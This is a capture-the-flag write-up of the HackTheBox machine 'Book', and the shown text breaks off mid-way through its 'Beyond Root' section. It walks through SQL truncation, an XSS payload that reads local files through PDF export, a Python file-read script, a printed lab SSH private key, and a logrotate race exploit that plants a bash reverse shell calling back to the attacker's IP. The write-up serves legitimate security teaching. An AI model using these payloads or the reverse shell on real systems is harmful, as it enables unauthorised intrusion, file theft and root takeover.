---
title: HTB: Book
url: https://0xdf.gitlab.io/2020/07/11/htb-book.html
date: 2020-07-11T14:45:00+00:00
difficulty: Medium [30]
os: Linux
tags: hackthebox, ctf, htb-book, nmap, ubuntu, gobuster, sql-truncation, sql, xss, lfi, pspy, logrotate, logrotten, crontab, oscp-plus-v2
---

![Book](https://0xdfimages.gitlab.io/img/book-cover.png)

Getting a foothold on Book involved identifying and exploiting a few vulnerabilities in a website for a library. First there’s a SQL truncation attack against the login form to gain access as the admin account. Then I’ll use a cross-site scripting (XSS) attack against a PDF export to get file read from the local system. This is interesting because typically I think of XSS as something that I present to another user, but in this case, it’s the PDF generate software. I’ll use this to find a private SSH key and get a shell on the system. To get root, I’ll exploit a regular logrotate cron using the logrotten exploit, which is a timing against against how logrotate worked. In Beyond Root, I’ll look at the various crons on the box and how they made it work and cleaned up.

## Box Info

| Name | [Book](https://hackthebox.com/machines/book)  [Book](https://hackthebox.com/machines/book) [Play on HackTheBox](https://hackthebox.com/machines/book) |
| --- | --- |
| Release Date | [22 Feb 2020](https://twitter.com/hackthebox_eu/status/1230496257875025921) |
| Retire Date | 11 Jul 2020 |
| OS | Linux Linux |
| Base Points | Medium [30] |
| Rated Difficulty | Rated difficulty for Book |
| Radar Graph | Radar chart for Book |
| First Blood User | 03:55:38[xct xct](https://app.hackthebox.com/users/13569) |
| First Blood Root | 06:31:22[xct xct](https://app.hackthebox.com/users/13569) |
| Creator | [MrR3boot MrR3boot](https://app.hackthebox.com/users/13531) |

## Recon

### nmap

`nmap` shows two open ports, HTTP (TCP 80) and SSH (TCP 22):

```

root@kali# nmap -p- --min-rate 10000 -oA scans/alltcp 10.10.10.176
Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-22 14:01 EST
Nmap scan report for 10.10.10.176
Host is up (0.020s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 7.94 seconds
root@kali# nmap -p 22,80 -sC -sV -oA scans/tcpscripts 10.10.10.176
Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-22 14:19 EST
Nmap scan report for 10.10.10.176
Host is up (0.015s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f7:fc:57:99:f6:82:e0:03:d6:03:bc:09:43:01:55:b7 (RSA)
|   256 a3:e5:d1:74:c4:8a:e8:c8:52:c7:17:83:4a:54:31:bd (ECDSA)
|_  256 e3:62:68:72:e2:c0:ae:46:67:3d:cb:46:bf:69:b9:6a (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: LIBRARY - Read | Learn | Have Fun
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.98 seconds

```

Based on both the [Apache](https://packages.ubuntu.com/search?keywords=apache2) and [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) versions, this looks like Ubuntu 18.04.

### Website - TCP 80

#### Site

The website offers a login page:

![image-20200225110857515](https://0xdfimages.gitlab.io/img/image-20200225110857515.png)

I can click the Sign Up button, and create an account:

![image-20200225110945917](https://0xdfimages.gitlab.io/img/image-20200225110945917.png)

Then I can log in, and it’s a website for a library:

![image-20200225111026234](https://0xdfimages.gitlab.io/img/image-20200225111026234.png)

The Books tab has a list of books:

![image-20200225111057627](https://0xdfimages.gitlab.io/img/image-20200225111057627.png)

The images are links to `http://10.10.10.176/download.php?file=1`. Visiting that link returns `1.pdf`.

The collections page offers upload:

![image-20200225111333575](https://0xdfimages.gitlab.io/img/image-20200225111333575.png)

Anything I submit results in a pop-up message:

![image-20200227215828506](https://0xdfimages.gitlab.io/img/image-20200227215828506.png)

I don’t see anywhere where the file might go. I wasn’t able to find it in looking around.

Contact Us also has a form I can submit:

![image-20200225111617276](https://0xdfimages.gitlab.io/img/image-20200225111617276.png)

It returns a pop-up and then redirects to the home page:

![image-20200225111639453](https://0xdfimages.gitlab.io/img/image-20200225111639453.png)

#### Directory Brute Force

`gobuster` turns up a few things:

```

root@kali# gobuster dir -u http://10.10.10.176 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php -t 40 -o scans/gobuster-root-php
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.176
[+] Threads:        40
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php
[+] Timeout:        10s
===============================================================
2020/02/22 14:04:18 Starting gobuster
===============================================================
/download.php (Status: 302)
/home.php (Status: 302)
/profile.php (Status: 302)
/docs (Status: 301)
/books.php (Status: 302)
/feedback.php (Status: 302)
/admin (Status: 301)
/contact.php (Status: 302)
/search.php (Status: 302)
/db.php (Status: 200)
/index.php (Status: 200)
/images (Status: 301)
/logout.php (Status: 302)
/collections.php (Status: 302)
/settings.php (Status: 302)
/server-status (Status: 403)
===============================================================
2020/02/22 14:08:46 Finished
===============================================================

```

The most interesting is `/admin`, which I ran `gobuster` against as well:

```

root@kali# gobuster dir -u http://10.10.10.176/admin -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php -t 40 -o scans/gobuster-a
dmin-php
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.176/admin
[+] Threads:        40
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php
[+] Timeout:        10s
===============================================================
2020/02/22 14:08:50 Starting gobuster
===============================================================
/index.php (Status: 200)
/home.php (Status: 302)
/feedback.php (Status: 302)
/users.php (Status: 302)
/messages.php (Status: 302)
/export (Status: 301)
/vendor (Status: 301)
/collections.php (Status: 302)
===============================================================
2020/02/22 14:15:18 Finished
===============================================================

```

#### /admin

Visiting `/admin` presents another login page:

![image-20200225111820880](https://0xdfimages.gitlab.io/img/image-20200225111820880.png)

The credentials I created here don’t work, just returning a message box:

![image-20200225111842031](https://0xdfimages.gitlab.io/img/image-20200225111842031.png)

## Shell as Reader

### Access to Admin Panel on Website

#### SQL Truncation Attack - Theory

The idea behind an SQL truncation attack is in how SQL handles input when it is longer than the field it’s going into. Under the hood, the site is likely doing two queries. First, I’ll check if the user already exists, with something like `SELECT * from users WHERE email = {input_email};`. If 0 rows return, the email isn’t in the database, and thus the site wants to add the user. So it will run a statement like `INSERT into users (email, username, password) VALUES ({input_email}, {input_username}, {input_password});` to add the user.

When you create a text field in an SQL database, you define the max length of the field. This attack looks at what happens when the input is longer than that. If the username field is 16 characters, the attack here is to send the known account identifier, plus enough spaces to expand beyond 16 characters, then a non-whitespace character.

The first query will run, and return 0 results because it can’t possibly match (because the string it too long to match anything in the DB). Then the second query runs, but because it’s an `INSERT`, it truncates the field at the max length (16). It then removes whitespace from the end, resulting in adding another row that has the duplicate key field.
*If* the site checks for login by searching for `SELECT * from users where username = {user} and password = {password}` and then checks that the number of results is 1, then the malicious duplicate entry will allow login. It’s better practice to pull the rows with the matching username, and then make sure there’s exactly one row, and that the passwords match (and of course, also store passwords as hashes and not plaintext).

#### SQL Truncation Attack - Against Book

If I try to create an account with email address `admin@book.htb`, the site returns a pop-up saying that the user exists:

![image-20200227201121873](https://0xdfimages.gitlab.io/img/image-20200227201121873.png)

![image-20200227201140583](https://0xdfimages.gitlab.io/img/image-20200227201140583.png)

This is good that I can enumerate users. I could brute force this using Hydra to find other @book.htb emails, but I don’t need to.

I’ll kick that POST request over to Burp, and add a space and then a period to the end of the email:

```

name=0xdf&email=admin%40book.htb+.&password=0xdf

```

When I submit that, it returns 302 (which is success here). I then try to login as admin@book.htb / 0xdf, but it fails. I then add another space and try again. Fails. But after the 6th space, I’m able to login:

```

name=0xdf&email=admin%40book.htb++++++.&password=0xdf

```

That tells me the max string size in the DB is 20. So when the `.` is in position 21, it’s dropped, and I registered a user as `admin@book.htb` (with trailing spaces removed).

Now I can login with these credentials to the admin panel.

It seems that the password for `admin@book.htb` resets about every minute, so it’s important to act fast after changing the password.

### XSS File Read

#### Enumeration

Logged into `/admin/` there are different menus:

![image-20200227220103625](https://0xdfimages.gitlab.io/img/image-20200227220103625.png)

`/admin/users.php` lists all the users:

![image-20200227220308758](https://0xdfimages.gitlab.io/img/image-20200227220308758.png)

`/admin/messages.php` shows the messages:

![image-20200227220330382](https://0xdfimages.gitlab.io/img/image-20200227220330382.png)

The `feedback.php` page has a table that’s empty:

![image-20200227220628005](https://0xdfimages.gitlab.io/img/image-20200227220628005.png)

Interestingly, there’s a `/feedback.php` that `gobuster` showed, and going there is a form, and posting to it will put in feedback here. I tried some XSS payloads, but didn’t get anything to work:

![image-20200227220742018](https://0xdfimages.gitlab.io/img/image-20200227220742018.png)

The Collections tab has a link to PDFs for Users and Collections.

![image-20200227220846801](https://0xdfimages.gitlab.io/img/image-20200227220846801.png)

The PDFs are just tables:

![image-20200227221025738](https://0xdfimages.gitlab.io/img/image-20200227221025738.png)

![image-20200227220954283](https://0xdfimages.gitlab.io/img/image-20200227220954283.png)

#### Things That Failed

There were a lot of places to enumerate for vulnerabilities for such a small site, and I tried a lot of things that didn’t work out, including:
- Looking for SQLi in all the forms.
- Looking for XSS in all the forms.
- Looking for any kind of XSRF vulnerabilities in the various GETs and POSTs.

#### Identify XSS In PDFs

I Googles “html to pdf exploit”, and the four results were interesting:

![image-20200227221455887](https://0xdfimages.gitlab.io/img/image-20200227221455887.png)

The second one was particularly interesting, as it showed how the author went about finding local file reads from the server using XSS in dynamically generated PDF. Typically, with an XSS, the attacker leaves some script on a page, and then waits for someone else to visit that page, causing the script to run on that users computer. But in the case of PDFs, the page is rendered on the server to be converted to PDF, and thus the script runs on the server.

Following the post, one of the test the author tired was submitting this:

```

 <p id="test">aa</p><script>document.getElementById('test').innerHTML+='aa'</script>

```

If that script runs, it should make a total of four `a` in the `<p>` tag.

I went to the Book submission tab on the non-admin site, and submitted test cases in each field:

![image-20200227221912699](https://0xdfimages.gitlab.io/img/image-20200227221912699.png)

I set both the id and the reference to the id in the second one `test2` so that I could test both fields independently. On viewing the PDF, both fields were vulnerable to XSS:

![image-20200227222452326](https://0xdfimages.gitlab.io/img/image-20200227222452326.png)

#### XSS for File Read

Now I’ll use this script from the same post to read `/etc/passwd`:

```

<script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open("GET","file:///etc/passwd");x.send();</script>

```

Instead of changing one field, it re-writes the entire document to be the contents of the given file, in this case, `/etc/passwd`. I submitted this as the title, and a dummy author, and then loaded the PDF again:

![image-20200227222709043](https://0xdfimages.gitlab.io/img/image-20200227222709043.png)

The table with the XSS seems to reset every minute, clearing out the XSS, which is actually good as I want to read multiple files, and don’t need them stomping each other.

### Scripting File Read

#### Creating the Script

I didn’t really need to do this, but it was a fun exercise to put all this together into a terminal script that allowed me to get files from Book. It took a fair bit of playing around in Burp comparing Python requests with ones made from Firefox to make sure I understood which headers mattered, and other things like that. The script is:

```

#!/usr/bin/python3

import requests
from cmd import Cmd
from tika import parser

class Terminal(Cmd):
    prompt = "book> "
    base_url = "http://10.10.10.176"

    def __init__(self):
        super().__init__()
        email = "0xdf@book.htb"
        password = "0xdf"
        self.user_sess = requests.session()
        #self.user_sess.proxies = {'http':'http://127.0.0.1:8080'}
        self.user_sess.get(f'{self.base_url}/index.php')
        self.user_sess.post(f'{self.base_url}/index.php', data=f"name=0xdf&email={email}&password={password}",
                headers={'Content-Type': 'application/x-www-form-urlencoded'})
        resp = self.user_sess.post(f'{self.base_url}/index.php', data=f"email={email}&password={password}",
                headers={'Content-Type': 'application/x-www-form-urlencoded'})
        if "Nope" in resp.text:
            print("[-] Failed to log in as user")
            exit()
        print(f"Session created as user: {self.user_sess.cookies['PHPSESSID']}")

        self.admin_sess = requests.session()
        #self.admin_sess.proxies = {'http':'http://127.0.0.1:8080'}
        self.admin_sess.get(f'{self.base_url}/index.php')
        self.admin_sess.post(f'{self.base_url}/index.php', data="name=0xdf&email=admin@book.htb                 .&password=0xdf",
                headers={'Content-Type': 'application/x-www-form-urlencoded'})
        resp = self.admin_sess.post(f'{self.base_url}/admin/', data='email=admin%40book.htb&password=0xdf',
                headers={'Content-Type': 'application/x-www-form-urlencoded'})
        if "Nope" in resp.text:
            print("[-] Failed to log in as admin")
            exit()
        print(f'Session created as admin: {self.admin_sess.cookies["PHPSESSID"]}')

    def default(self, args):
        # Upload XSS
        files = {'Upload': ('file.pdf', 'dummy data', 'application/pdf')}
        values = {'title': '<script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open("GET","file://' + args + '");x.send();</script>',
                  'author': '0xdf',
                  'Upload': 'Upload'}
        resp = self.user_sess.post(f'{self.base_url}/collections.php', files=files, data=values, allow_redirects=False, proxies={'http':'http://127.0.0.1:8080'})

        # Get Results
        resp = self.admin_sess.get(f'{self.base_url}/admin/collections.php?type=collections')
        pdf = parser.from_buffer(resp.content)
        print(pdf['content'].strip())

term = Terminal()
try:
    term.cmdloop()
except KeyboardInterrupt:
    print()

```

I create a `Cmd` Terminal object, and invoke it’s `cmdloop()`. On initialization, it creates sessions for both a user login (after creating that user), and an admin session (after using SQL-truncation to set a password). Then, when a path is entered, it uses that path to send an XSS through the user session, and then gets the PDF through the admin session. Then it parses the PDF to pull the text out using [tika](https://github.com/chrismattmann/tika-python), and prints it. The spacing got a bit weird at times, but it worked good enough:

```

root@kali# python3 book_file_read.py 
Session created as user: cr7qe72admu9iqk9aja5pcc7nv 
Session created as admin: 4mo93ht69to89sc4vuv3j81rn9     
book> /etc/passwd                            
root:x:0:0:root:/root:/bin/bash                    
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin    sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin      www-data:x:33:33:www-
data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing    List    Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin        gnats:x:41:41:Gnats
Bug-Reporting   System  (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin      systemd-
network:x:100:102:systemd       Network
Management,,,:/run/systemd/netif:/usr/sbin/nologin      systemd-
resolve:x:101:103:systemd
Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
reader:x:1000:1000:reader:/home/reader:/bin/bash
mysql:x:111:114:MySQL   Server,,,:/nonexistent:/bin/false

```

#### Issues

If I don’t wait a minute before sending the next query, both XSS entries will still be there, and therefore the request will return both files:

```

book> /etc/lsb-release
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin    sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin      www-data:x:33:33:www-
data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing    List    Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin        gnats:x:41:41:Gnats
Bug-Reporting   System  (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin      systemd-
network:x:100:102:systemd       Network
Management,,,:/run/systemd/netif:/usr/sbin/nologin      systemd-
resolve:x:101:103:systemd
Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
reader:x:1000:1000:reader:/home/reader:/bin/bash
mysql:x:111:114:MySQL   Server,,,:/nonexistent:/bin/false
DISTRIB_ID=Ubuntu       DISTRIB_RELEASE=18.04
DISTRIB_CODENAME=bionic DISTRIB_DESCRIPTION="Ubuntu
18.04.2 LTS"
book> 

```

After waiting a minute, I get just the one file:

```

book> /etc/lsb-release
DISTRIB_ID=Ubuntu       DISTRIB_RELEASE=18.04
DISTRIB_CODENAME=bionic DISTRIB_DESCRIPTION="Ubuntu
18.04.2 LTS"

```

Additionally, the spacing is a bit messed up. Above, the file should look like:

```

DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=18.04
DISTRIB_CODENAME=bionic
DISTRIB_DESCRIPTION="Ubuntu 18.04.2 LTS"

```

Some of the whitespace gets messed up.

Finally, some of the PHP files don’t exfil well at all:

```

book> /var/www/html/index.php
prepare("select email   from    users   where   email=?");      $stmt-
>bind_param('s',$_POST["email"]);       $stmt->execute();       $result =       $stmt-
>get_result();  $num_rows=$result->num_rows;    if($num_rows    >       0)      {
echo    '
book>

```

`/var/www/html/db.php` returns nothing (and breaks the shell).

### File System Enumeration

After failing to read the php source, I thought about what else I might grab. Since I could see the `/etc/passwd` file, I knew that reader was the only interactive user on the box. I checked for an SSH key, and got a hit:

```

book> /home/reader/.ssh/id_rsa
-----BEGIN      RSA     PRIVATE KEY-----
MIIEpQIBAAKCAQEA2JJQsccK6fE05OWbVGOuKZdf0FyicoUrrm821nHygmLgWSpJ
G8m6UNZyRGj77eeYGe/7YIQYPATNLSOpQIue3knhDiEsfR99rMg7FRnVCpiHPpJ0
WxtCK0VlQUwxZ6953D16uxlRH8LXeI6BNAIjF0Z7zgkzRhTYJpKs6M80NdjUCl/0
ePV8RKoYVWuVRb4nFG1Es0bOj29lu64yWd/j3xWXHgpaJciHKxeNlr8x6NgbPv4s
7WaZQ4cjd+yzpOCJw9J91Vi33gv6+KCIzr+TEfzI82+hLW1UGx/13fh20cZXA6PK
75I5d5Holg7ME40BU06Eq0E3EOY6whCPlzndVwIDAQABAoIBAQCs+kh7hihAbIi7
3mxvPeKok6BSsvqJD7aw72FUbNSusbzRWwXjrP8ke/Pukg/OmDETXmtgToFwxsD+
McKIrDvq/gVEnNiE47ckXxVZqDVR7jvvjVhkQGRcXWQfgHThhPWHJI+3iuQRwzUI
tIGcAaz3dTODgDO04Qc33+U9WeowqpOaqg9rWn00vgzOIjDgeGnbzr9ERdiuX6WJ
jhPHFI7usIxmgX8Q2/nx3LSUNeZ2vHK5PMxiyJSQLiCbTBI/DurhMelbFX50/owz
7Qd2hMSr7qJVdfCQjkmE3x/L37YQEnQph6lcPzvVGOEGQzkuu4ljFkYz6sZ8GMx6
GZYD7sW5AoGBAO89fhOZC8osdYwOAISAk1vjmW9ZSPLYsmTmk3A7jOwke0o8/4FL
E2vk2W5a9R6N5bEb9yvSt378snyrZGWpaIOWJADu+9xpZScZZ9imHHZiPlSNbc8/
ciqzwDZfSg5QLoe8CV/7sL2nKBRYBQVL6D8SBRPTIR+J/wHRtKt5PkxjAoGBAOe+
SRM/Abh5xub6zThrkIRnFgcYEf5CmVJX9IgPnwgWPHGcwUjKEH5pwpei6Sv8et7l
skGl3dh4M/2Tgl/gYPwUKI4ori5OMRWykGANbLAt+Diz9mA3FQIi26ickgD2fv+V
o5GVjWTOlfEj74k8hC6GjzWHna0pSlBEiAEF6Xt9AoGAZCDjdIZYhdxHsj9l/g7m
Hc5LOGww+NqzB0HtsUprN6YpJ7AR6+YlEcItMl/FOW2AFbkzoNbHT9GpTj5ZfacC
hBhBp1ZeeShvWobqjKUxQmbp2W975wKR4MdsihUlpInwf4S2k8J+fVHJl4IjT80u
Pb9n+p0hvtZ9sSA4so/DACsCgYEA1y1ERO6X9mZ8XTQ7IUwfIBFnzqZ27pOAMYkh
sMRwcd3TudpHTgLxVa91076cqw8AN78nyPTuDHVwMN+qisOYyfcdwQHc2XoY8YCf
tdBBP0Uv2dafya7bfuRG+USH/QTj3wVen2sxoox/hSxM2iyqv1iJ2LZXndVc/zLi
5bBLnzECgYEAlLiYGzP92qdmlKLLWS7nPM0YzhbN9q0qC3ztk/+1v8pjj162pnlW
y1K/LbqIV3C01ruxVBOV7ivUYrRkxR/u5QbS3WxOnK0FYjlS7UUAc4r0zMfWT9TN
nkeaf9obYKsrORVuKKVNFzrWeXcVx+oG3NisSABIprhDfKUSbHzLIR4=
-----END        RSA     PRIVATE KEY-----

```

### SSH

With that key, I could SSH in as reader:

```

root@kali# ssh -i ~/id_rsa_book_reader reader@10.10.10.176
Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 5.4.1-050401-generic x86_64)
 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri Feb 28 03:55:47 UTC 2020

  System load:  0.02               Processes:            146
  Usage of /:   26.6% of 19.56GB   Users logged in:      1
  Memory usage: 25%                IP address for ens33: 10.10.10.176
  Swap usage:   0%
 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

114 packages can be updated.
0 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Fri Feb 28 03:05:30 2020 from 10.10.14.30
reader@book:~$

```

And get `user.txt`:

```

reader@book:~$ cat user.txt
51c1d4b5************************

```

## Priv: reader –> root

### Enumeration

In `/home/reader/`, there’s a folder, `backsups`. In this folder, there are two log files:

```

reader@book:~/backups$ ls -l
total 4
-rw-r--r-- 1 reader reader    0 Jan 29 13:05 access.log
-rw-r--r-- 1 reader reader   91 Jan 29 13:05 access.log.1

reader@book:~/backups$ cat access.log.1
192.168.0.104 - - [29/Jun/2019:14:39:55 +0000] "GET /robbie03 HTTP/1.1" 404 446 "-" "curl"

```

That date stamp is a month ago. I uploaded [pspy](https://github.com/DominicBreuker/pspy) and gave it a run. There were a lot of things kicking of periodically. The most interesting thing was root’s running `sleep` and `logrotate` every five seconds:

```

2020/02/28 04:04:05 CMD: UID=0    PID=15522  | /usr/sbin/logrotate -f /root/log.cfg
2020/02/28 04:04:05 CMD: UID=0    PID=15521  | /bin/sh /root/log.sh
2020/02/28 04:04:05 CMD: UID=0    PID=15523  | sleep 5  

```

`logrotate` is designed to move log files periodically to backup files, and allows administrators to set the maximum number of logs to keep, and thresholds for rotation (size, time, etc). I can’t tell what log is defined in the given config file, `/root/log.cfg`, but given the presence of the `backups` directory, I hypothesize that it’s these logs.

To test, I’ll write something to `access.log`, and see if it rotates in the next five seconds:

```

reader@book:~/backups$ echo 0xdf > access.log
reader@book:~/backups$ ls
access.log  access.log.1
reader@book:~/backups$ ls
access.log  access.log.1
reader@book:~/backups$ ls
access.log  access.log.1  access.log.2

```

When `access.log.2` show up, that is the result of `logrotate`.

### logrotate Exploit

#### Theory

Googling for “logrotate exploit” led me to [this post](https://tech.feedyourhead.at/content/abusing-a-race-condition-in-logrotate-to-elevate-privileges). There’s a race condition in `logrorate`. When `logrotate` is run above, it does the following:
1. `mv access.log.1 access.log2`
2. `mv access.log access.log.1`
3. `touch access.log` with ownership of reader:reader.

The race condition is that if an attacker can execute commands between 2 and 3 above to replace `/home/reader/backup` with a symlink to somewhere else, then root will create a file in any folder the attacker wants on the system owned by the reader.

The post above contains a POC in C that uses `inotify` to watch for a given file to move, in this case, I’ll pass it `access.log`. Once it moves, the code does two things:

```

            rename(logpath,logpath2);
            symlink(targetdir,logpath);

```

First, it moves `/home/reader/backup` to `/home/reader/backup2`.

Then it creates a symlink at `/home/reader/backup` pointing to the target directory, which by default is `/etc/bash_completion.d`.

`/etc/bash_competion` and `/etc/bash_completion.d` are scripts that are run when a new bash session is started for any user that define how tab completion will work. For example, on my computer, I have one for Git, so when I type `git checko[tab]`, it knows to complete that to `git checkout`.

By creating a file in `/etc/bash_completion.d` that is owned by reader, the exploit can now write the payload into that file, and that payload will be run each time a user logs in. It turns out that root is also logging in periodically.

#### Practice

Staging out of `/dev/shm`, I’ll paste the exploit source in and compile it:

```

reader@book:/dev/shm$ gcc -o logrotten logrotten.c 

```

I’ll also create a simple bash reverse shell (and test is as reader to make sure it works).

Because I know things are resetting every five seconds, I’ll act quickly, writing the log file and then running the exploit in one line:

```

reader@book:/dev/shm$ echo 0xdf >> /home/reader/backups/access.log; ./logrotten /home/reader/backups/access.log rev_shell.sh 
logfile: /home/reader/backups/access.log
logpath: /home/reader/backups
logpath2: /home/reader/backups2
targetpath: /etc/bash_completion.d/access.log
targetdir: /etc/bash_completion.d
p: access.log
reader@book:/dev/shm$

```

Once it returns, I can see the reverse shell is now in the `bash_completion.d` folder:

```

reader@book:/dev/shm$ ls -l /etc/bash_completion.d/
total 32
-r-xr-xr-x 1 reader reader    55 Feb 28 13:08 access.log
-rw-r--r-- 1 root   root    6636 Nov 20  2017 apport_completion
-rw-r--r-- 1 root   root    3211 Oct  2  2018 cloud-init
-rw-r--r-- 1 root   root     439 Nov 26  2018 git-prompt
-rw-r--r-- 1 root   root   11144 Mar 18  2019 grub

reader@book:/dev/shm$ cat /etc/bash_completion.d/access.log 
#!/bin/bash

bash -i >& /dev/tcp/10.10.14.30/443 0>&1 

```

A few seconds later I get a callback on my `nc` listener:

```

root@kali# nc -lnvp 443
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.176.
Ncat: Connection from 10.10.10.176:56192.
root@book:~# id
uid=0(root) gid=0(root) groups=0(root) 

```

The first time I ran this the shell dropped after a few seconds. I had a couple other false starts, but eventually got a shell that was stable. I grabbed `root.txt`:

```

root@book:~# cat root.txt
84da92ad************************

```

## Beyond Root

There’s a lot of automated user activity on this box that’s worth taking a look at. All of it starts at the root crontab:

```

root@book:~# crontab -l
...[snip]...
# m h  dom mon dow   command
@reboot /root/reset.sh
* * * * * /root/cron_root
*/5 * * * * rm /etc/bash_completion.d/*.log*
*/2 * * * * /root/clean.sh

```

On start up (`@reboot`), root will run `/root/reset.sh` (I added some whitespace for readability):

```

#!/bin/sh
while true
do
        /root/log.sh && sleep 5
        if [ -d /home/reader/backups2 ];then
                sleep 5 && \
                rm -rf /home/reader/backups && \
                mv /home/reader/backups2 /home/reader/backups && \
                echo '192.168.0.104 - - [29/Jun/2019:14:39:55 +0000] "GET /robbie03 HTTP/1.1" 404 446 "-" "curl"' > /home/reader/backups/access.log && \
                chown -R reader:reader /home/reader/backups && \
                rm /home/reader/backups/access.log.*
        fi
done

```

This script is an infinite loop that will run `/root/log.sh` and `sleep 5`. Then if there’s a directory `/home/reader/backups2`, it will `sleep 5` again, remove `home/reader/backsups` (presumably the symlink), move `backups2` to `backups`, set `access.log` back to the default value, set the ownership of the directory, and remove any logs beyond the first.

So in addition to cleaning up the exploit I just ran, it’s also running `log.sh` every five seconds:

```

#!/bin/sh
/usr/sbin/logrotate -f /root/log.cfg

```

That’s the source of the `logrotate` call. I can now see the config as well:

```

/home/reader/backups/access.log {
        daily
        rotate 12
        missingok
        notifempty
        size 1k
        create
}

```

`notifempty` shows why it doesn’t rotate until I write something to it.

The second cron is `/root/root_cron` every minute:

```

#!/usr/bin/expect -f
spawn ssh -i .ssh/id_rsa localhost
expect eof
exit

```

This is an [expect script](https://en.wikipedia.org/wiki/Expect) to have root login, which will run the bash completion script.

The third cron just clears anything `.log` out of the bash completion directory, again, cleaning up after the known exploit.

The fourth cron runs `clean.sh` every two minutes:

```

#!/bin/sh
